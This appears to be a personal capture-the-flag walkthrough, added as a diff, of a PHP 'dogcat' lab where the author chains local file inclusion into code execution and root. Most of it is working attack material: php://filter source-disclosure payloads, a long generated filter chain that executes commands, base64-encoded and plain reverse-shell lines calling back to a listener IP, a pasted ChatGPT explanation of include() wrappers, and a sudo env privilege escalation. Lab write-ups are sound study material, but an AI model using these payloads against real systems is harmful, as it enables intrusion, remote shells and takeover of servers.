@@ -1,1 +1,412 @@
 
+->
+press dogs / cats -> funny
+->
+see 2 new folders dogs / cats
+->
+?view=asdadsads -> Sorry only dogs or cats are allowed
+->
+tried to put dogs folder / index.php / 
+->
+?view=dogs -> Warning: include(dogs.php):
+
+# failed to open stream: No such file or
+directory in /var/www/html/index.php on line 24
+
+# Warning: include(): Failed opening 'dogs.php'
+for inclusion (include_path='.:/usr/local/lib/php')
+in /var/www/html/index.php on line 24
+
+
+
+->
+# weve seen that when a random gibrish is enterd in view
+parm returns an error `only dogs and cats allowed`
+
+# weve seen that when enterd dogs an error returned
+`Warning: include(): Failed opening 'dogs.php' `
+
+# meaning the code checks if the string containsStr dogs and 
+  if it does in the view param value than append .php to it
+  and try to include($_GET['view']
+->
+# 
+Sites used to study advanced lfi via php:// :
+# https://book.hacktricks.xyz/pentesting-web/file-inclusion
+# https://www.php.net/manual/en/wrappers.php.php
+
+Used this one to create the payload
+# https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md#tricks
+
+->
+?view=php://filter/convert.base64-encode/resource=dogs/../index
+->
+base64 decode the response
+->
+
+--------------------
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>dogcat</title>
+    <link rel="stylesheet" type="text/css" href="/style.css">
+</head>
+
+<body>
+    <h1>dogcat</h1>
+    <i>a gallery of various dogs or cats</i>
+
+    <div>
+        <h2>What would you like to see?</h2>
+        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
+        <?php
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
+            if(isset($_GET['view'])) {
+                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
+                    echo 'Here you go!';
+                    include $_GET['view']" . $ext;
+                } else {
+                    echo 'Sorry, only dogs or cats are allowed.';
+                }
+            }
+        ?>
+    </div>
+</body>
+
+</html>
+
+
+
+
+-----------------
+CHATGPT
+
+?view=php://filter/convert.base64-encode/resource=dog/../index
+
+
+<?php system("sh -i >& /dev/tcp/10.6.66.80/1234 0>&1"); ?>
+
+PD9waHAgc3lzdGVtKCJzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjEyMi4yNDkvMTIzNCAwPiYxIik7ID8+
+
+php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
+
+
+
+
+PD9waHAgc3lzdGVtKCJzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjEyMi4yNDkvMTIzNCAwPiYxIik7ID8+
+
+PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCJzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjEyMi4yNDkvMTIzNCAwPiYxIik7ID8+
+
+
+
+User
+explain in depth what data can include() can accept
+ChatGPT
+The include() function in PHP is used to include and
+evaluate files during the execution of a script. It
+allows incorporating the content of a specified file
+directly into the script being executed at the point
+where the include() statement appears. This function
+accepts various types of data as parameters:
+
+1. File Path/String: The most common usage of include()
+is providing a file path or a string representing the
+path to the file to be included. For example:
+
+php
+Copy code
+include('myfile.php'); // Relative or absolute file path
+You can use a relative path from the current script or an
+absolute path pointing to the file to be included.
+
+
+
+2. URLs (if enabled): In certain server configurations where
+allow_url_include is enabled in PHP settings (which is
+typically not recommended due to security risks), you might
+be able to include files from remote locations using URLs. For example:
+
+php
+Copy code
+include('http://example.com/remote_file.php');
+Note: Using remote file inclusion through URLs
+can pose significant security risks and should
+be done cautiously or avoided whenever possible.
+
+
+
+
+
+3. Dynamic Data/Variables: include() can also accept
+dynamic data or variables that represent file paths. For instance:
+
+php
+Copy code
+$file = 'myfile.php';
+include($file); // Using a variable containing the file path
+This allows for dynamic inclusion based on variable values.
+
+
+
+
+
+4. Streams: PHP supports various streams via wrappers like php://,
+data://, etc. You can include data from streams using include(). For example:
+
+php
+Copy code
+include('php://input'); // Includes data from the input stream
+or:
+
+php
+Copy code
+include('data://text/plain;base64,SGVsbG8gV29ybGQh'); // Includes data from a data stream
+The data:// wrapper allows including data directly from the given string,
+which might be encoded or formatted.
+
+
+
+
+When using include(), it's essential to ensure proper handling of input data,
+especially if the data is dynamic or user-controlled, to prevent security
+vulnerabilities such as directory traversal attacks or remote code execution.
+
+Additionally, there are related functions like require(), require_once(),
+include_once() that have similar functionality with some differences in how
+they handle file inclusion and error handling.
+
+
+
+
+
+
+------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+Followed the 2. section in the chatgpt chat conversation above
+
+
+nano dog.php
+->
+<?php system("sh -i >& /dev/tcp/10.6.66.80/1234 0>&1"); ?>
+->
+ip a && python -m http.server 80  
+->
+nc -lvnp 1234
+-> 
+10.10.129.170/?view=http://10.6.66.80/dog.php&ext=
+
+include(): http:// wrapper is disabled
+in the server configuration by allow_url_include=0
+in /var/www/html/index.php on line 24 
+
+FUCKKKKKK so close
+
+
+
+
+Followed the 3. section in the chatgpt chat conversation above
+
+->
+php://input
+NOTE that this filter takes
+data from the http body request
+->
+GET /?view=php://input&ext= HTTP/1.1
+
+Host: 10.10.129.170
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+system("sh -i >& /dev/tcp/10.6.66.80/1234 0>&1");
+
+->
+problem because i need to include do in the view get
+param withot intrerupting the php://filter
+
+->
+
+instead i asked gpt what can include after the 
+php://input which led me to the next idea
+
+
+gpt gave me this:
+// Decoding base64 and then decompressing gzip-encoded data
+$processedData = file_get_contents('php://filter/zlib.inflate,convert.base64-decode/resource=php://input');
+
+
+
+->
+
+a cool method  to comibine
+php://filter & php://input
+
+php://filter/convert.base64-decode/resource=($_GET['ext'] == dog ? (php://input) : (php://input))
+
+
+->
+
+thant i got the next idea (url encoded):
+?view=False ? 'dog.php' : 'php://input'&ext=
+
+# so the php code can have dog in the
+param (via view) & have body of the request
+
+and the body with the shell
+
+-> 
+
+
+
+
+
+
+
+include file_put_contents(php://memory,"<?php system('sh -i >& /dev/tcp/10.6.66.80/1234 0>&1')#dogs >?")
+
+include(): Failed opening 'file_put_contents(php://memory,&quot;&lt;?php system('sh -i &gt;&amp;
+/dev/tcp/10.6.66.80/1234 0&gt;&amp;1')#dogs &gt;?&quot;)' for inclusion (include_path='.:/usr/local/lib/php') in
+
+
+see &gt, %amp, etc...
+
+->
+
+i added php escape characters
+
+file_put_contents(php://memory,\"\<\?php system('sh -i \>\& /dev/tcp/10.6.66.80/1234 0\>\&1')#dogs >?")
+
+
+-> 
+didnt work also
+
+
+
+->
+red the following :
+
+https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html
+
+https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d
+
+https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py
+
+https://www.youtube.com/watch?v=TnLELBtmZ24&
+
+-> 
+understood the code in using the first link (synactiv) & the video (4th link)
+NOTE : the table / digrams in the first link realy explains the syntax followed in the php://filter payload
+NOTE : also the video (4th link)
+
+
+https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py
+
+NOTE: the code apears in all of the links above
+
+->
+
+python php_filter_chain_generator.py --chain "<?php system($_GET['c']);?>"
+
+wont work because of an terminal syntax need to flip the quotation marks
+
+->
+
+python php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
+
+
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+
+
+-> 
+
+change the php://temp at the end of the payload to be
+
+php://tempdog&ext=&c=<cmd>
+
+
+->
+
+php://tempdog&ext=&c=ls
+
+Here you go!cat.php cats dog.php dogs flag.php index.php style.css $)C�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@ 
+
+->
+
+php://tempdog&ext=&c=cat flag.php
+
+CTRL + U
+
+<?php
+$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
+?>
+
+
+-> 
+
+php://tempdog&ext=&c=echo "sh -i >& /dev/tcp/10.6.66.80/1234 0>&1">r 
+
+->
+
+nc -lvnp 1234
+
+php://tempdog&ext=&c=echo "sh -i >& /dev/tcp/10.6.66.80/1234 0>&1">r
+
+php://tempdog&ext=&c=echo%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.6.66.80%2F1234%200%3E%261%22%3Er
+
+php://tempdog&ext=&c=bash r
+
+
+
+-> 
+find / -name "flag*" 2>/dev/null
+
+/var/www/html/flag.php                                                                                         
+/var/www/flag2_QMW7JvaY2LvK.txt
+
+->
+
+cat /var/www/html/flag.php -> THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
+cat /var/www/flag2_QMW7JvaY2LvK.txt -> THM{LF1_t0_RC3_aec3fb}
+
+
+-> 
+sudo -l
+
+(root) NOPASSWD: /usr/bin/env
+
+->
+
+GTFOBins
+
+sudo env -p /bin/sh
+
+->
+
+ls /root
+flag3.txt
+cat /root/flag3.txt
+
+THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
+
+->
+
+
+
